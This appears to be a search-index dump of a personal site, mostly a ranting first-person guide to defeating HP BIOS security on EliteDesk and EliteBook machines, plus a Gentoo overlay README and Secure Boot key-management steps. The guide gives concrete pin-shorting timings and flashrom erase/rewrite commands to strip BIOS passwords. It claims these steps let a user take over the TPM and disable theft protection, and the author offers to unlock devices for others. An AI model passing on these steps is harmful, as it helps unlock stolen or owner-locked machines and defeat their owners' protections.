wuseman@nr1.nu WEB SITE Visit our homepage for the latest info and updated tools https://nr1.nu & https://github.com/wuseman/ END!","title":"wuseman-overlay"},{"location":"gentoo/wuseman-overlay/#readme","text":"This is my personal Gentoo overlay for packages not added in portage tree and ebuilds I have not been able to find anywhere else. All ebuilds have been commited by 'repoman -dx commit'..","title":"README"},{"location":"gentoo/wuseman-overlay/#howto","text":"Create wuseman-overlay.conf into /etc/portage/repos.conf/ cat << \"EOF\" > /etc/portage/repos.conf/wuseman-overlay.conf [ wuseman-overlay ] # Simple example 'overlaid' ebuild repository location = /var/db/repos/wuseman-overlay priority = 0 auto-sync = no #masters-gentoo EOF And run below commands for clone and sync wuseman-overlay mkdir -p /etc/portage/repos.conf/ { wuseman-overlay,metadata } echo -e \"masters = gentoo\" > /etc/portage/repos.conf/metadata/layout.conf echo -e 'LOCAL_PORTDIR=\"/etc/portage/repos.conf/\"' >> /etc/portage/make.conf git clone https://github.com/wuseman/wuseman-overlay /var/db/repos/wuseman-overlay which eix & > /dev/null ; [[ $? -eq 0 ]] && eix-sync ; eix-update || emerge --sync","title":"HOWTO"},{"location":"gentoo/wuseman-overlay/#references","text":"https://github.com/gentoo/gentoo https://github.com/pentoo/pentoo-overlay","title":"References"},{"location":"gentoo/wuseman-overlay/#contact","text":"If you have problems, questions, ideas or suggestions please contact us by posting to wuseman@nr1.nu","title":"CONTACT"},{"location":"gentoo/wuseman-overlay/#web-site","text":"Visit our homepage for the latest info and updated tools https://nr1.nu & https://github.com/wuseman/","title":"WEB SITE"},{"location":"gentoo/wuseman-overlay/#end","text":"","title":"END!"},{"location":"hacking/","text":"info hacking related stuff will be found here","title":"hacking"},{"location":"hacking/#info","text":"hacking related stuff will be found here","title":"info"},{"location":"hacking/bios/","text":"bios hacking All kind of bios hacks will be found here","title":"bios"},{"location":"hacking/bios/#bios-hacking","text":"All kind of bios hacks will be found here","title":"bios hacking"},{"location":"hacking/bios/hp_device_and_bios-hacking/","text":"\u26a0 IMPORTANT: This repo is updated daily, things can be removed / changed anytime - This text will be gone when I got things sorted and misspellings and other small things will be corrected during time, At bottom you will find the \"proper\" way how things should be done. I do not recommend anyone to use my methods wich is tagged (DANGEROUS METHOD) if you do not know exactly what you are doing ! I really mean what I say, your computer will probably die and never be able to start again. No harm has been done on HP's property! # HP Wolf Security: The World\u2019s Most Secure PC\u2019s | Security ---=== Elitebook - ThinClient - EliteDesk - PowerBook - Printers - BIOS ===--- \u26a0 WARNING: YOUR COMPUTER WILL BE BRICKED - THERE IS NO GUARANTEES !! The author/developer in this repo can never be held responsible for the actions of other users and I have warned you! If the computer is dead, you cant fix it without replacing the the motherboard. The chip alone is not enough. Call HP for assistance if you don't know how to solve it yourself, you may brick your warranty by follow this repo! \u26a0 DANGER: This repo can contain illegal acts depending on the country you live in. It is strictly forbidden and it can end with high penalties such as imprisonment for fraudulent behavior. You are responsible for your own actions and you can never ever blame wuseman for your acts. Manipulating data of various things to deceive a third party by selling a computer where hardware figures are manipulated and false warranty can be presented is a very serious crime, in almost all countries.. I urge no one to commit crimes, I dedicate this repo to everyone as a non-profit hacker/cracker of software and hardware devices to show how you are deceived by advertising. ### [Video Introduction for Wolf Security: A New Breed of Endpoint Security | Security | HP ](https://www.youtube.com/watch?v=KOq4LutcLr0) Please watch the video above to follow the story I will do overtime in this repo \"Hackers are also working from home, isn't it time you had a security that does too? \" HP's story: \" What It Really Takes to Catch a Hacker | HP \" \"HP WOLF Security: The hacker is always on THE HUNT\" \"THE WORLD'S MOST SECURE AND MANAGEABLE WORKTATIONS\" \"PROTECT SENSITIVE DATA AND IP, WITH HARDWARE-ENFORCED SECURITY\" \"Sure Start Protects the Bios\" While in the case of WIPER of ransomware attacks or hadware attacks. Sure Recovery provices fast, effective recovery\" ....... it never ends, it's crazy they talk so much and provide 0 proofs, 0!!!...... wuseman story: My banner is from by HP and the hoodie guy is what HP refers to the \"bad guys\" and they are the wolves .. If the bolded text is true ..... We are more vulnerable then ever? .. Then we should be we able to hack the Bios within seconds ....... is my first thought? \"They laught at me because i'm different. I laught at them becuase they all are the same with economic interests.\" / Edited quote, from Joker! HP: My first bios I managed to hack was from Compaq and since that day when I was 6 years old I have followed your developers for over 30 years now. We do not have to guess, we know how good your employees are from asia with extremely small salaries while you pull in billions on misleading and false advertising. Who are the \"bad guys\" in your ads? We'll see. This repo will be updated frequently and recurring as you develop your security. My first thought that appeared immediately was, if I short circuit the chip it will (please notice healing) heal itself not recover/restore itself, healing is an unusual word in these terms. I decide to belive my thoughts and the results can be found below . Sounds crazy? Maybe.. Not for me.. I love to try crazy things which should be \"impossible\". I have strangely enough succeeded with many crazy and wierd \"hacks\" of all kind that should not be possible BUT I will not lie for anyone, I have also failed a lot before I got older and wiser. These are things I will talk about that when I retire, until then I will continue to do everything in my power to try to hack time to count backwards. =) Bypassing/Hacking Secure Boot as a pro (to be updated) Visit Rod Smiths wiki for get a deeper knowledge, its an awesome wiki imo and cover everything that is worth to know imo even for none refind users: https://www.rodsbooks.com/refind/installing.html This part is for Gentoo Users - Scroll down to skip this Before you will try anything I wanna tell you that you are able to bypass the secure boot protection if you have some linux skills. Windows setups can be installed always since the certs are from microsoft, ubuntu and kubuntu I know have preinstalled shim installed. This will fix this so we can boot Gentoo Minimal CD because with secureboot enable you gonna be stopped by the picture as above that says \"image did not authenticate\". BACKUP THE KEYS FROM OLDER INSTALL BEFORE YOU DOING ANYTHING STUPID AS ERASE OR RESE THE KEYS * sys-boot/mokutil Available versions: ( ~ ) 0 .3.0_p20170405 ( ~ ) 0 .5.0-r1 Homepage: https://github.com/lcp/mokutil Description: The utility to manipulate machines owner keys which managed in shim * sys-boot/shim Available versions: 15 .5-r1 Homepage: https://apps.fedoraproject.org/packages/shim/ Description: Fedora ' s signed UEFI shim Install shim and mokutil, no useflags are available so we just installing them as usual, you also gonna need openssl since we need this for create keys and also ca-certificates for the certs but they are probably already installed but if not: emerge -av sys-boot/mokutil sys-boot/shim app-misc/ca-certificates dev-lib/openssl First, list all enrolled or new keys mokutil --list-enrolled [ key 1 ] SHA1 Fingerprint:.... ... [ key 2 ] SHA1 Fingerprint:.... List new keys mokutil --list-new You can check the current secureboot state with: mokutil --sb-state You want to export the current keys if there is any, of course ;) mokutil --export The above command will give you .der keys in the folder you execute the command, files is named: MOK-00**.der, save all those files in some encrypted container or at least secure place (security is always nr1, encrypt everything) before you deleting them and adding new ones! You now want to delete the old keys, you can use wildcard for this part as below: mokutil --delete MOK*.der If you want, set root password: sudo mokutil --root-pw ....or a custom password sudo mokutil --password input password: input password again: Rebooted and answer the questions (comming soon more detailed) and see if the keys has been deleted ;) Enjoy the removal of the old keys! You are l33t! Create your own keys/setup enrollment Verify that MOK is enabled. Use the following commands on the target to enable or disable MOK: mokutil --enable-validation mokutil --disable-validation You use this password to manage keys using mokutil and to confirm their enrollment and other operations when the MOK manager is running. In addition to console input, mokutil supports other methods to input the password. Enroll a key certificate. Convert a standard PEM key to a DER-formatted X509 certificate for shim_cert.cer and vendor_cert.cer. openssl x509 -in shim_cert.crt -inform PEM -out shim_cert.cer -outform DER openssl x509 -in vendor_cert.crt -inform PEM -out vendor_cert.cer -outform DER Enroll the shim_cert.cer certificate. mokutil --import shim_cert.cer You must set up the password for this MoK manipulation request, as this password is required by the shim loader in the next reboot. Review the key enrollments. Use the following command to verify whether a key is active already or not: mokutil --test-key shim_cert.cer mokutil --test-key vendor_cert.cer Since the vendor_cert.cer key is the built-in certificate in the boot loader, is is enrolled during the first boot. Use the following command to list the current key enrollment requests: mokutil --list-new [ key 1 ] SHA1 Fingerprint: ......... Certificate: Data: Version: 3 ( 0x2 ) Serial Number: Now Reboot the target. Once the target reboots, the Shim UEFI Key Management screen is displayed where you are given below options Press: Continue boot Press: Enroll MOK, choose yes! Enroll key from disk Enroll hash from disk Enroll your keys and enter password. Enjoy Some pictures of things that failed / appeared when I played with this. There is no explanation but just sharing them for fun. Lets Try Short Circuit the Chip There is alot of people trying this already since the protection has been very good (Started with Probooks), but no public releases for the latest HP devices has been found. Good question below and good answer was provided on the url below, it simply depends! Again, be careful \"Long story short when testing some IC chips in circuit and powered on I must have touched a couple legs at once causing a chip to short. My quick question, is this damage usually contained just to the chip itself or does it spread to surrounding resistors and capacitors etc.? No smoke or burnt components or anything like that.\" Q: Is this damage usually contained just to the chip itself or does it spread to surrounding resistors and capacitors etc? A: It Depends.... It's a very hard question to answer, really. Hack to learn not learn to hack and you will figure out ;) IC Chip short circuit repercussions HP EliteDesk 800 GX + G5 (DANGEROUS METHOD) Born On Date................: ` 2022 -03-01 ` Secured by latest features..: ` yes ` Bios Chip...................: ` 25B127DSIG ` BiosProgrammer..............: ` CH341a ` Require Bios Programmer.....: ` no ` Level of difficulty.........: ` simple ` * Tools Recommended: Microscope so you can watch the legs so you are not shortcuits the wrong one by mistake * Tools Required..............: 1x Phillips screwdriver 1x Tiny wire ( I used 2 mini grabbers for safety ) G5 has extra features then older elitebooks for bios password. It is possible to set security settings to \"Ignore\" the cmos jumper and reset reset button if pressed on motherboard. If the setting is set to IGNORE you are fucked, you will NOT not succeed in getting around without programmers. so if you try on this unit and do not understand why it does not work, it is precisely because it can ignore this that many other Elitedesk can NOT. The clip is easy to find, its under the below nvme disk (if you have two) and you can read the chip via a Soic Clip 8 THIS WILL BRICK YOUR PC - DO IT ON YOUR OWN RISK!! PLEASE NOTICE THE LEGS 1, 7, 8 are from my PICTURE, NOT FROM THE DATASHEET!!! A wire on pin 1 and 7 for ~1.2s erased Intel Firmware A wire on pin 1 and 8 for ~1.0s bios noticed something happend and restore itself A wire on leg 1 and 8 for ~3.0s erased Bios Password Pins Impressive, I was wrong about all this, well well. After 1 touch on pin 1 and 8 (notice just a touch like in 0.1ms) we gonna see below I still don't trust their shit so before I saying I was wrong and they won, I try 2. seconds! Since ages back in the days for some reason I know 4.2 seconds will brick the device if we touch the pins. And this is something I just has figured out on many devices, I can't confirm or promise it will work the same for you so dont listen on this if you didnt try and then cry in pm to me I tried to hold a wire on leg 1 and leg 8, now things happens! Bios missmatch! Now its dangerous, and I'm not as impressed anymore. One more wrong and things will be bricked, Now it's 50/50 .. HP or wuseman, who's right? It will not be a fourth time I know from past experience. Fuck it, i\u00b4m to curios and since ages i know 4.2 seconds is the limit for break things as I said so I decided to try: 3.0 seconds while PC was ON running as normal.... after 3.0s I pull the AC and keep it off for 25 seconds.. The PC wont die itself so you must pull the AC REMOVE THE BATTERY BEFORE DOING THIS! Holy maria! it does not even start! Leaving AC out and pressing power button for 25 seconds, gave life to the computer, damn now it flashes red and beeps every time the led flashes! According to the HP dev manual for what 3 x beeps + 3 red flashing indicates its the CPU or GPU. What the hell? It should be 4.2 seconds before it breaks on cpu, mem, motherboard, bios or gpu! Fuck, now things was bricked! I thought \u2026After device is blinking red and fan had run at 10k rpm few times we finally have device booting, THUMBS UP! HP's manuals sucks! ;-) First screen we gonna see is that date is wrong, i didnt fix a picture on this. just press continue Second screen we gonna see is that intel firmware is fucked, press ok Intel firmware install is in progress Device reboots after a while and reading bios up to 16M will start and finally you will see the below screen. Next screen takes us to to gbe recovery (will it never ends?) Now it want us to upgrade once again, i choose yes After the shortcuit and few reboot, it was time to enter bios and see if its password protects!! IT IS GONE! Now, feel free to set your own bios password and then press F11 and choose network recovery Worlds most secured BIOS that has hardware protection was \"hacked\" in ~3.0 second! We are now able to take over windows also! (will be added later) The only question I have to HP is, did you never try this? Do you now understand why I want to have a technical analysis for your tests? You talk about losses, re-start by showing your winnings based on false advertising instead. You are a scam and fooling your customers with fabricated statistics! Fuck you! If HP's bios is the most secure bios in the world that will protect the companies from hackers incl. tpm protections and keys and keep the real black hats away from private data then it's just as true that I'm sitting on the planet \"Jupiter\" and writing this, there are no laws and rules here so therefore I do not break any laws and rules here, ezi! .. Idiots \u2026 *In hps advertising, they are the bad guys, and I the wolf hence the banner! Fuck you HP \u2026 This is just the first part, I will update this repo with MORE proofs of your lies, next up is laptops followed by printers. Stay tuned! General info about Elitedesks! There is another switch on the motherboard, its not easy to find and the switch is not available wiht chassi closed I Really recommends to use a \u00b4better clip then the cheap ones, spend some money for a 3M clip ~20-30\u20ac, the chip black ones from china sucks as hell! After 2-3 grabs it's not possible to grab the clip anymore. (probably thats why they sell those clips in 4-6xPackets on amazon - DONT BUY THOSE!!! >See yourself below after FEW grabs, it destroys the chip after few times) HP Sure Adminm / HP Sure Run and Secure PLatform Management is not provisioned anymore You are now the full admin of the system and you can erase old TPM and take over this part Followed by reset all security featrures, not eve theft protection will help the owner, we can permanent disable this (permanent is not permanent as forever, we can rewrite the chip ofc) Invalid Manifest If you got problems with system recovery via F11 and bios gonna say there is a problem with manifest as: \"error finding valid manifest\" do as below (this problem was a mess with my Elitebook 870 G3 to figure out and solve, hp now have a help part for this for several models on their site, not all devices are affected - Visit hp for more info if needed) To avoid the issue:** Do not initiate a Preboot network enabled feature when the computer is on low battery power. Avoid pressing the power button. Do not use the CTRL+ALT+DEL key combination to restart the computer while a download or upload is in progress. To work around this issue, perform the following steps to reset the IPv4 configuration: 1 . Power on the computer. 2 . Press F3 to enter the 3rd Party Option ROM Management menu. 3 . Navigate to Network Device List -> MAC:xx:xx:xx:xx:xx:xx -> IPv4 Network Configuration. 4 . Uncheck Configured. 5 . Select Save Changes and Exit. Help with password removal I don't know if I will add this part here yet but upload your bios dump to any of the forums and I will help you or someone else will do, I am active there too for this stuff. Please dump the right file and not the firmware file from EFI file. If you really don't know what im talking about, find me on irc and I will remove the password for you, for free, dont pay for things you don't need ;) Cheers! Bios Upgrade via Linux DOwnload the bios for your device @hp .com extract the .exe file: 7x x spXXXXX.exe mkdir -p /boot/EFI/HP/BIOS/ { New,Previous,Old,Current,Temp } mount /dev/bootPartiton /boot cp spXXXXX.exe/*. { bin,ini } /boot/EFI/HP/BIOS/New unmount /boot/ reboot Now, enter F9 and choose to boot from ifle, choose the correct file. Bios will now upgrade Method 2 After you moved the correct file to New path on boot partition Turn off PC, while you holding win+b press power button for 2 seconds, release the power button but keep press win+b Bios upgrade should now start. Happy Upgrading! HP Elitebook 870 G3 (DANGEROUS METHOD) Belive it or not. You maybe thought it was just luck what I was trying, as I did. So i decided to ask a friend to try in his PC as well. See the result below, brand new laptop: I wont add all pictures again, i will show you the really needed pictures otherwise you can follow the same step as above its the same story for elitebooks with the latest bioses that is self-healing (really latest models only) So .. Short circuit trick is dangerous but I wanted to confirm this for Elitebooks also.. It's no coincidence, it's wuseman power.. nah is not, its because HP fucking sucks! I guess they spent billions of dollars in their ads and their bios is hacking by short cuiiting their bios chip and then we dont even need to fix it, it healing itself! This has to be the dumbest thing I've ever been through. As I said, it also works on elitebook! Same legs from my view, same seconds (3.0seconds) on a different chip, i toke some picture on it with my microscope. See below, no descriptions will be added unless its something I really wanna share since its the same story as above dangerous method. there is fucking expensive clips for WSON chips for ~100-300$, these. If you are careful enough, you can do the same as me, otherwise you have to take the heat gun and solder and stuff. Same as above but on the elitebook i was able to take a picture, this is how it looks after we boots first time when device has been acting as the elitedesk Didnt start Caps lock led + numlock led was flashing 7 times ( i will add a video later i cant find it now ) fan runs at 10k rpm or something, rebooting and doing this for few times and we now got into this screen: This never happened on elitedesks only on elitebook, I guess thats cause the software and efi can't communicate anymore since the bios was erased and now healed Sure Recovery, every screen that will popup Downloading Boot.wmi Downloading Boot.sdi Downloadintg BCD Device that was hacked in 3.0 seconds and I confirmed the same shit works on this healing bios. But i don't recommending anyone to try, use the safe method otherwise you may get a broken cpu,gpu,mem,motherboard or anything: Connect to wifi via CIRCA (F3 in bios menu) WIFI REQUIRED SINCE THERE IS NO ETHERNE INPUT ON THIS ONE Preparing HP Setup + Windows WSON Bios Chip 870 G3 chip is a Winbond 25Q256JVEN 2111 6048 CZ900 Tested my new microscope usb, not perfect photos but it was the first time I used it :P Other chips for test the microscrope, they pretty good. Now we have a valid license and activated Windows 10 from stock, now go reinstall firmware and get the hell out of Windows (nah, we must run some stuff here before we do that, i will add how we gonna take over TPM later) Recommended, safe way. Follow the same steps as on elitedesk but you need either a modded clip or a wson programmer, here is my modded one. My special clip in progress Enjoy! Elitebook 820 - Programmer required! The Short CIRCUIT will NOT work on this device!!! Use your programmer to dump bios and remove the password with prefered hexedit tool and write it back to device without the the bios password, its now fully unlocked! =D My modded custom clip grabbed this one aswell, you must have the pins outside the clip as on my picture the above for being able to touch the solder from the pins on the board since there is no legs, if you using a default clip it will just grab the black area and it will probably end like the picture below. See the zoomed version what happens with a non-modded / wson clipper (this is for avaoid soldering, that\u00b4s boring rly) .. If you get your clip working, there is better and more serious custom made SOP WSON SOIC VSOP SPI FLASH 8P 1.27mm on stores online, below is the modded ones from stores. Normal price on amazon is ~100-300$ but some stores in asia sell them for ~40$ - I would recommend a such one instead, its rly cool works on ALL 4x2 chips and you wont need solder anymore, connect it to your programmer or ardunio and start hack the bios dump.. I have nothing more to add here, programmer required here and if you short circuit this and think you will succeed, I can promise you, you wont! Already failed on ~2 few years ago and no new bios has been released so just buy a programmer and do it the proper way, but if you really wanna try - Go for it, i don't care and don't ask me for help about this model. Its old and and sucks! Cheers Repair SPM: This is only needed if you short circuited the bios, otherwise you can fix this in bios settings under security. For fix the SPM if its not possible to fix this from bios security settings, see below: If you short cuited the chip, the output from below command will be alot of wierd text and looks like a mess. Get-HPSecurePlatformState It should be like: State : NotConfigured Version : 1.0 Nonce : 0 FeaturesInUse : None EndorsementKeyMod : {0, 0, 0, 0...} SigningKeyMod : {0, 0, 0, 0...} For fix this, please see below (it will works if your output is messed up as well, i never saved the output but you will understand what I mean if you get there and typing the command above) - You also needs HP Sure Admin and HP Recovery from HP's download page (will add urls later, search on hp and you will find for now) openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -subj \"/C=US/ST=State/L=City/O=Company/OU=Org/CN=www.example.com\" openssl pkcs12 -inkey key.pem -in cert.pem -export -keypbe PBE-SHA1-3DES -certpbe PBE-SHA1-3DES -out kek.pfx -name \"HP Secure Platform Key Endorsement Certificate\" -passout pass:test openssl req -x509 -nodes -newkey rsa:2048 -keyout key.pem -out cert.pem -days 3650 -subj \"/C=US/ST=State/L=City/O=Company/OU=Org/CN=www.example.com\" openssl pkcs12 -inkey key.pem -in cert.pem -export -keypbe PBE-SHA1-3DES -certpbe PBE-SHA1-3DES -out sk.pfx -name \"HP Secure Platform Signing Key Certificate\" -passout pass:test New-HPSecurePlatformEndorsementKeyProvisioningPayload -EndorsementKeyFile . \\k ek.pfx -EndorsementKeyPassword test ` | Set-HPSecurePlatformPayload New-HPSecurePlatformSigningKeyProvisioningPayload -EndorsementKeyFile . \\k ek.pfx -EndorsementKeyPassword test ` -SigningKeyFile . \\s k.pfx -SigningKeyPassword test | Set-HPSecurePlatformPayload Now please check again : State : ProvisioningInProgress Version : 1 .0 Nonce : 1581536418 FeaturesInUse : None EndorsementKeyMod : { 236 , 247 , 128 , 76 ... } SigningKeyMod : { 194 , 160 , 105 , 233 ... } So this is about it, when working with Secure Platform Management. To view any associated logs, you can use the Get-HPFirmwareAuditLog function. The last thing you may want to do is deprovision. For this, you will need the endorsement key: New-HPSecurePlatformDeprovisioningPayload -EndorsementKeyFile . \\t ests \\t estdata \\n opw \\k ek.pfx ` -EndorsementKeyPassword test | Set-HPSecurePlatformPayload SPM with HPCMSL in the Enterprise So how would you plug HPCMSL in your enterprise to manage SPM? The solution is meant to be management console agnostic, so whether you use SCCM, Intune, Ivanti, or whatever else, these are the basic steps: Install HPCMSL in a secure location, and place your certificates here. Also Install HPCMSL on your managed clients In the secure location, use HPCMSL to generate a secure payload, as described above, using one of the New-* functions. Copy this secure payload to your clients via your process of choice. Do not copy your certificates. On your clients, apply the payload generated in 3. above, via the Set-HPSecurePlatformPayload function. All commands can be found here: Developers Portal Hacking Bios Password Via Linux: Please visit flashrom for more info if you are a newbie, dont guess anything before you trying. If possible, try on something else that may not brick your PC before you trying on your real pc if you are new in this world: Wel well, download flashrom (i prefer install things from the source and not via package manager with this kind of tools) Download flashrom and Signature wget https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2 wget https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2.asc You should next verify that the key's full fingerprint matches that listed on the flashroms website: gpg --verify ... you should know this awk '/SHA512 HASH/{getline;print}' flashrom-v1.2.tar.bz2.asc | sha512sum --check flashrom-v1.2.tar.bz2: OK flashrom-v1.2.tar.bz2.asc: OK Extract flashrom tar -xvf flashrom-v1.2.tar.bz2 or if wanna skip the signature part, downaload and extract via stdin wget -c https://download.flashrom.org/releases/flashrom-v1.2.tar.bz2 -O - | sudo tar -xj Install flashrom cd flashrom-v1.2 make -j $( nproc ) If there is no errors, move on with make install and now, use your programmer, see available programmers via typing flashrom only and you will get all available programmers Now lets continue This is the The Secure/Recommended/Best way to erase the bios password by dump the current bios file, remove the password via prefered hexeditor, write the hacked dump without any password back to chip, voila - Done! Well, its not that easy maybe but follow below steps and everything will be fine :) Flashrom will detect your chip and know its model by itself: Read Chip flashrom -p ch341a_spi -r Read and Backup* flashrom -p ch341a_spi -r -o bios_elitebook_backup.bin or flashrom -p ch341a_spi -r > bios_elitebook_backup.bin Now erase the bios with password protected bios flashrom -p ch341a_spi -E You don't need to remove the password from the bin file from a hexeditor, bios will \"heal\" itself.. Please try. If im wrong, just remove the password via hexedit (this will not be covered in this repo at the moment, will add a tutorial how you can do this without uploading your file for help later) and re-write the chip: Not needed if you are on latest models, but in case you wanna do it: flashrom -p ch341a_spi -w hacked_bios_file_with_no_pw.bin On older bios versions, you must crack the password OR remove the password from bios file with a hexeditor \u26a0 READ + SAVE YOUR BIOS BEFORE YOU ERASING IT IN CASE SOMETHING GOES WRONG! Windows Download NeoProgrammer v2.2.0.10 and put the clip on the chip, read bios for backup and then erase it, done! On older bios versions, you must crack the password OR remove the password from bios file with a hexeditor and write the new bios file to the chip - You should know how to do this if you reading this. More devices will be added, to be continued! Advanced Tools / Recommended Tools - Windows: Greetings to Jeff, all resepect! RWEverything - All versions \u2026 Alot more to be added very soon HP Urls: HP BIOS Configuration Utility HP BIOS Configuration Utility FAQ Client Management Script Library References Daniel Enberg - How To Deploy HP BIOS Settings Using SCCM and HP BIOS Configuration Utility Some HP Laptops Have A Hidden Keylogger That Hackers Can Activate August, 2010 - Bios Password Hack for HP EliteBook Part 1 License This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details\u2026 Contact If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here .","title":"hp bios"},{"location":"hacking/bios/hp_device_and_bios-hacking/#hps-story","text":"\" What It Really Takes to Catch a Hacker | HP \" \"HP WOLF Security: The hacker is always on THE HUNT\" \"THE WORLD'S MOST SECURE AND MANAGEABLE WORKTATIONS\" \"PROTECT SENSITIVE DATA AND IP, WITH HARDWARE-ENFORCED SECURITY\" \"Sure Start Protects the Bios\" While in the case of WIPER of ransomware attacks or hadware attacks. Sure Recovery provices fast, effective recovery\" ....... it never ends, it's crazy they talk so much and provide 0 proofs, 0!!!......","title":"HP's story:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#wuseman-story","text":"My banner is from by HP and the hoodie guy is what HP refers to the \"bad guys\" and they are the wolves ..","title":"wuseman story:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#if-the-bolded-text-is-true--we-are-more-vulnerable-then-ever","text":".. Then we should be we able to hack the Bios within seconds ....... is my first thought? \"They laught at me because i'm different. I laught at them becuase they all are the same with economic interests.\" / Edited quote, from Joker! HP: My first bios I managed to hack was from Compaq and since that day when I was 6 years old I have followed your developers for over 30 years now. We do not have to guess, we know how good your employees are from asia with extremely small salaries while you pull in billions on misleading and false advertising. Who are the \"bad guys\" in your ads? We'll see. This repo will be updated frequently and recurring as you develop your security. My first thought that appeared immediately was, if I short circuit the chip it will (please notice healing) heal itself not recover/restore itself, healing is an unusual word in these terms. I decide to belive my thoughts and the results can be found below . Sounds crazy? Maybe.. Not for me.. I love to try crazy things which should be \"impossible\". I have strangely enough succeeded with many crazy and wierd \"hacks\" of all kind that should not be possible BUT I will not lie for anyone, I have also failed a lot before I got older and wiser. These are things I will talk about that when I retire, until then I will continue to do everything in my power to try to hack time to count backwards. =)","title":"If the bolded text is true ..... We are more vulnerable then ever?"},{"location":"hacking/bios/hp_device_and_bios-hacking/#bypassinghacking-secure-boot-as-a-pro-to-be-updated","text":"Visit Rod Smiths wiki for get a deeper knowledge, its an awesome wiki imo and cover everything that is worth to know imo even for none refind users: https://www.rodsbooks.com/refind/installing.html","title":"Bypassing/Hacking Secure Boot as a pro (to be updated)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#this-part-is-for-gentoo-users---scroll-down-to-skip-this","text":"Before you will try anything I wanna tell you that you are able to bypass the secure boot protection if you have some linux skills. Windows setups can be installed always since the certs are from microsoft, ubuntu and kubuntu I know have preinstalled shim installed. This will fix this so we can boot Gentoo Minimal CD because with secureboot enable you gonna be stopped by the picture as above that says \"image did not authenticate\". BACKUP THE KEYS FROM OLDER INSTALL BEFORE YOU DOING ANYTHING STUPID AS ERASE OR RESE THE KEYS * sys-boot/mokutil Available versions: ( ~ ) 0 .3.0_p20170405 ( ~ ) 0 .5.0-r1 Homepage: https://github.com/lcp/mokutil Description: The utility to manipulate machines owner keys which managed in shim * sys-boot/shim Available versions: 15 .5-r1 Homepage: https://apps.fedoraproject.org/packages/shim/ Description: Fedora ' s signed UEFI shim","title":"This part is for Gentoo Users - Scroll down to skip this"},{"location":"hacking/bios/hp_device_and_bios-hacking/#install-shim-and-mokutil-no-useflags-are-available-so-we-just-installing-them-as-usual-you-also-gonna-need-openssl-since-we-need-this-for-create-keys-and-also-ca-certificates-for-the-certs-but-they-are-probably-already-installed-but-if-not","text":"emerge -av sys-boot/mokutil sys-boot/shim app-misc/ca-certificates dev-lib/openssl","title":"Install shim and mokutil, no useflags are available so we just installing them as usual, you also gonna need openssl since we need this for create keys and also ca-certificates for the certs but they are probably already installed but if not:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#first-list-all-enrolled-or-new-keys","text":"mokutil --list-enrolled [ key 1 ] SHA1 Fingerprint:.... ... [ key 2 ] SHA1 Fingerprint:....","title":"First, list all enrolled or new keys"},{"location":"hacking/bios/hp_device_and_bios-hacking/#list-new-keys","text":"mokutil --list-new","title":"List new keys"},{"location":"hacking/bios/hp_device_and_bios-hacking/#you-can-check-the-current-secureboot-state-with","text":"mokutil --sb-state","title":"You can check the current secureboot state with:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#you-want-to-export-the-current-keys-if-there-is-any-of-course-","text":"mokutil --export The above command will give you .der keys in the folder you execute the command, files is named: MOK-00**.der, save all those files in some encrypted container or at least secure place (security is always nr1, encrypt everything) before you deleting them and adding new ones!","title":"You want to export the current keys if there is any, of course ;)"},{"location":"hacking/bios/hp_device_and_bios-hacking/#you-now-want-to-delete-the-old-keys-you-can-use-wildcard-for-this-part-as-below","text":"mokutil --delete MOK*.der","title":"You now want to delete the old keys, you can use wildcard for this part as below:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#if-you-want-set-root-password","text":"sudo mokutil --root-pw ....or a custom password sudo mokutil --password input password: input password again: Rebooted and answer the questions (comming soon more detailed) and see if the keys has been deleted ;) Enjoy the removal of the old keys! You are l33t!","title":"If you want, set root password:"},{"location":"hacking/bios/hp_device_and_bios-hacking/#create-your-own-keyssetup-enrollment","text":"Verify that MOK is enabled. Use the following commands on the target to enable or disable MOK: mokutil --enable-validation mokutil --disable-validation You use this password to manage keys using mokutil and to confirm their enrollment and other operations when the MOK manager is running. In addition to console input, mokutil supports other methods to input the password.","title":"Create your own keys/setup enrollment"},{"location":"hacking/bios/hp_device_and_bios-hacking/#enroll-a-key-certificate","text":"Convert a standard PEM key to a DER-formatted X509 certificate for shim_cert.cer and vendor_cert.cer. openssl x509 -in shim_cert.crt -inform PEM -out shim_cert.cer -outform DER openssl x509 -in vendor_cert.crt -inform PEM -out vendor_cert.cer -outform DER","title":"Enroll a key certificate."},{"location":"hacking/bios/hp_device_and_bios-hacking/#enroll-the-shim_certcer-certificate","text":"mokutil --import shim_cert.cer","title":"Enroll the shim_cert.cer certificate."},{"location":"hacking/bios/hp_device_and_bios-hacking/#you-must-set-up-the-password-for-this-mok-manipulation-request-as-this-password-is-required-by-the-shim-loader-in-the-next-reboot","text":"","title":"You must set up the password for this MoK manipulation request, as this password is required by the shim loader in the next reboot."},{"location":"hacking/bios/hp_device_and_bios-hacking/#review-the-key-enrollments","text":"Use the following command to verify whether a key is active already or not: mokutil --test-key shim_cert.cer mokutil --test-key vendor_cert.cer Since the vendor_cert.cer key is the built-in certificate in the boot loader, is is enrolled during the first boot. Use the following command to list the current key enrollment requests: mokutil --list-new [ key 1 ] SHA1 Fingerprint: ......... Certificate: Data: Version: 3 ( 0x2 ) Serial Number:","title":"Review the key enrollments."},{"location":"hacking/bios/hp_device_and_bios-hacking/#now-reboot-the-target","text":"","title":"Now Reboot the target."},{"location":"hacking/bios/hp_device_and_bios-hacking/#once-the-target-reboots-the-shim-uefi-key-management-screen-is-displayed-where-you-are-given-below-options","text":"Press: Continue boot Press: Enroll MOK, choose yes! Enroll key from disk Enroll hash from disk Enroll your keys and enter password. Enjoy","title":"Once the target reboots, the Shim UEFI Key Management screen is displayed where you are given below options"},{"location":"hacking/bios/hp_device_and_bios-hacking/#some-pictures-of-things-that-failed--appeared-when-i-played-with-this-there-is-no-explanation-but-just-sharing-them-for-fun","text":"","title":"Some pictures of things that failed / appeared when I played with this. There is no explanation but just sharing them for 